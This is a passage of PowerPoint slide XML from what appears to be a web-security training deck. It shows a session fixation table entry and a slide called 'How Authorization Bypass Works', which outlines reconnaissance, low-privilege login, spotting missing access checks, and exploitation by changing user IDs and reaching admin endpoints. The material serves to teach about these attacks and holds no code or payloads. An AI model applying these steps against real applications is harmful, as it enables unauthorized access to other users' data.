            <a:ext cx="2407206" cy="215027"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="1650"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1200" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="272525"/>
                </a:solidFill>
                <a:latin typeface="Inter" pitchFamily="34" charset="0"/>
                <a:ea typeface="Inter" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Inter" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Session Fixation</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="47" name="Text 45"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4749760" y="6568916"/>
            <a:ext cx="2403396" cy="430054"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="squar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Force user to use attacker's session</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="48" name="Text 46"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7477482" y="6568916"/>
            <a:ext cx="2403396" cy="215027"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="non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A07:2021</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="49" name="Text 47"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="10205204" y="6568916"/>
            <a:ext cx="2407206" cy="215027"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="1650"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1200" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="007EBD"/>
                </a:solidFill>
                <a:latin typeface="Inter" pitchFamily="34" charset="0"/>
                <a:ea typeface="Inter" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Inter" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>High</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94730" y="865942"/>
            <a:ext cx="7910632" cy="651391"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="non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How Authorization Bypass Works</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="4100" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Text 1"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="694730" y="1586746"/>
            <a:ext cx="4168854" cy="521017"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="4100"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="3250" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Petrona Bold" pitchFamily="34" charset="0"/>
                <a:ea typeface="Petrona Bold" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Petrona Bold" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Attack Flow Diagram</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="3250" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Text 2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="694730" y="2368272"/>
            <a:ext cx="198477" cy="248126"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="2300"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1550" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="272525"/>
                </a:solidFill>
                <a:latin typeface="Petrona Light" pitchFamily="34" charset="0"/>
                <a:ea typeface="Petrona Light" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Petrona Light" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>01</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1550" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Shape 3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="694730" y="2682716"/>
            <a:ext cx="4297799" cy="22860"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="007EBD"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Text 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="694730" y="2827615"/>
            <a:ext cx="2605564"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Reconnaissance</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2050" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Text 5"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="694730" y="3257431"/>
            <a:ext cx="4297799" cy="1191250"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="342900" indent="-342900" algn="l">
              <a:lnSpc>
                <a:spcPts val="2300"/>
              </a:lnSpc>
              <a:buSzPct val="100000"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1550" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="272525"/>
                </a:solidFill>
                <a:latin typeface="Inter" pitchFamily="34" charset="0"/>
                <a:ea typeface="Inter" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Inter" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Identify user roles (admin, user, guest)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1550" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="342900" indent="-342900" algn="l">
              <a:lnSpc>
                <a:spcPts val="2300"/>
              </a:lnSpc>
              <a:buSzPct val="100000"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1550" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="272525"/>
                </a:solidFill>
                <a:latin typeface="Inter" pitchFamily="34" charset="0"/>
                <a:ea typeface="Inter" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Inter" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Map application endpoints</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1550" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="342900" indent="-342900" algn="l">
              <a:lnSpc>
                <a:spcPts val="2300"/>
              </a:lnSpc>
              <a:buSzPct val="100000"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1550" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="272525"/>
                </a:solidFill>
                <a:latin typeface="Inter" pitchFamily="34" charset="0"/>
                <a:ea typeface="Inter" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Inter" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Discover hidden parameters</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1550" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="342900" indent="-342900" algn="l">
              <a:lnSpc>
                <a:spcPts val="2300"/>
              </a:lnSpc>
              <a:buSzPct val="100000"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1550" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="272525"/>
                </a:solidFill>
                <a:latin typeface="Inter" pitchFamily="34" charset="0"/>
                <a:ea typeface="Inter" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Inter" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Analyze access control patterns</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1550" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="Text 6"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5166241" y="2368272"/>
            <a:ext cx="198477" cy="248126"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="2300"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1550" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="272525"/>
                </a:solidFill>
                <a:latin typeface="Petrona Light" pitchFamily="34" charset="0"/>
                <a:ea typeface="Petrona Light" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Petrona Light" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>02</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1550" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="Shape 7"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5166241" y="2682716"/>
            <a:ext cx="4297799" cy="22860"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="007EBD"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10" name="Text 8"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5166241" y="2827615"/>
            <a:ext cx="2605564"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Authentication</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2050" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="11" name="Text 9"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5166241" y="3257431"/>
            <a:ext cx="4297799" cy="893437"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="342900" indent="-342900" algn="l">
              <a:lnSpc>
                <a:spcPts val="2300"/>
              </a:lnSpc>
              <a:buSzPct val="100000"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1550" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="272525"/>
                </a:solidFill>
                <a:latin typeface="Inter" pitchFamily="34" charset="0"/>
                <a:ea typeface="Inter" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Inter" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Login as low-privilege user</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1550" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="342900" indent="-342900" algn="l">
              <a:lnSpc>
                <a:spcPts val="2300"/>
              </a:lnSpc>
              <a:buSzPct val="100000"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1550" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="272525"/>
                </a:solidFill>
                <a:latin typeface="Inter" pitchFamily="34" charset="0"/>
                <a:ea typeface="Inter" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Inter" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Capture legitimate requests</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1550" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="342900" indent="-342900" algn="l">
              <a:lnSpc>
                <a:spcPts val="2300"/>
              </a:lnSpc>
              <a:buSzPct val="100000"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1550" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="272525"/>
                </a:solidFill>
                <a:latin typeface="Inter" pitchFamily="34" charset="0"/>
                <a:ea typeface="Inter" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Inter" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Analyze authorization mechanisms</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1550" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="Text 10"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9637752" y="2368272"/>
            <a:ext cx="198477" cy="248126"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="2300"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1550" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="272525"/>
                </a:solidFill>
                <a:latin typeface="Petrona Light" pitchFamily="34" charset="0"/>
                <a:ea typeface="Petrona Light" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Petrona Light" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>03</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1550" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="13" name="Shape 11"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9637752" y="2682716"/>
            <a:ext cx="4297799" cy="22860"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="007EBD"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="14" name="Text 12"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9637752" y="2827615"/>
            <a:ext cx="2605564"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Identify Vulnerability</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2050" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="15" name="Text 13"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9637752" y="3257431"/>
            <a:ext cx="4297799" cy="1191250"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="342900" indent="-342900" algn="l">
              <a:lnSpc>
                <a:spcPts val="2300"/>
              </a:lnSpc>
              <a:buSzPct val="100000"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1550" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="272525"/>
                </a:solidFill>
                <a:latin typeface="Inter" pitchFamily="34" charset="0"/>
                <a:ea typeface="Inter" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Inter" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Missing authorization checks</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1550" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="342900" indent="-342900" algn="l">
              <a:lnSpc>
                <a:spcPts val="2300"/>
              </a:lnSpc>
              <a:buSzPct val="100000"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1550" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="272525"/>
                </a:solidFill>
                <a:latin typeface="Inter" pitchFamily="34" charset="0"/>
                <a:ea typeface="Inter" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Inter" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Client-side only validation</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1550" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="342900" indent="-342900" algn="l">
              <a:lnSpc>
                <a:spcPts val="2300"/>
              </a:lnSpc>
              <a:buSzPct val="100000"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1550" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="272525"/>
                </a:solidFill>
                <a:latin typeface="Inter" pitchFamily="34" charset="0"/>
                <a:ea typeface="Inter" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Inter" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Predictable resource identifiers</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1550" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="342900" indent="-342900" algn="l">
              <a:lnSpc>
                <a:spcPts val="2300"/>
              </a:lnSpc>
              <a:buSzPct val="100000"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1550" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="272525"/>
                </a:solidFill>
                <a:latin typeface="Inter" pitchFamily="34" charset="0"/>
                <a:ea typeface="Inter" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Inter" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Insecure direct object references</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1550" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="16" name="Text 14"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="694730" y="4468705"/>
            <a:ext cx="198477" cy="248126"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="2300"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1550" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="272525"/>
                </a:solidFill>
                <a:latin typeface="Petrona Light" pitchFamily="34" charset="0"/>
                <a:ea typeface="Petrona Light" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Petrona Light" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>04</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1550" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="17" name="Shape 15"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="694730" y="4783149"/>
            <a:ext cx="6533555" cy="22860"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="007EBD"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="18" name="Text 16"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="694730" y="4928048"/>
            <a:ext cx="2605564"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Exploitation</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2050" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="19" name="Text 17"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="694730" y="5357864"/>
            <a:ext cx="6533555" cy="1191250"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="342900" indent="-342900" algn="l">
              <a:lnSpc>
                <a:spcPts val="2300"/>
              </a:lnSpc>
              <a:buSzPct val="100000"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1550" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="272525"/>
                </a:solidFill>
                <a:latin typeface="Inter" pitchFamily="34" charset="0"/>
                <a:ea typeface="Inter" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Inter" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Modify user IDs in requests</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1550" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="342900" indent="-342900" algn="l">
              <a:lnSpc>
                <a:spcPts val="2300"/>
              </a:lnSpc>
              <a:buSzPct val="100000"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1550" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="272525"/>
                </a:solidFill>
                <a:latin typeface="Inter" pitchFamily="34" charset="0"/>
                <a:ea typeface="Inter" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Inter" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Access admin endpoints directly</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1550" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="342900" indent="-342900" algn="l">
              <a:lnSpc>
                <a:spcPts val="2300"/>
              </a:lnSpc>
              <a:buSzPct val="100000"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1550" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="272525"/>
                </a:solidFill>
                <a:latin typeface="Inter" pitchFamily="34" charset="0"/>
                <a:ea typeface="Inter" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Inter" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Tamper with parameters</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1550" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="342900" indent="-342900" algn="l">
              <a:lnSpc>
                <a:spcPts val="2300"/>
              </a:lnSpc>
              <a:buSzPct val="100000"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1550" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="272525"/>
                </a:solidFill>
                <a:latin typeface="Inter" pitchFamily="34" charset="0"/>
                <a:ea typeface="Inter" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Inter" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Bypass client-side restrictions</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1550" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="20" name="Text 18"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7401997" y="4468705"/>
            <a:ext cx="198477" cy="248126"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="2300"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1550" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="272525"/>
                </a:solidFill>
                <a:latin typeface="Petrona Light" pitchFamily="34" charset="0"/>
                <a:ea typeface="Petrona Light" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Petrona Light" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>05</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1550" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="21" name="Shape 19"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7401997" y="4783149"/>
            <a:ext cx="6533555" cy="22860"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="007EBD"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="22" name="Text 20"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7401997" y="4928048"/>
            <a:ext cx="2605564" cy="325636"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="2550"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2050" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="272525"/>
                </a:solidFill>
                <a:latin typeface="Petrona Bold" pitchFamily="34" charset="0"/>
                <a:ea typeface="Petrona Bold" pitchFamily="34" charset="-122"/>
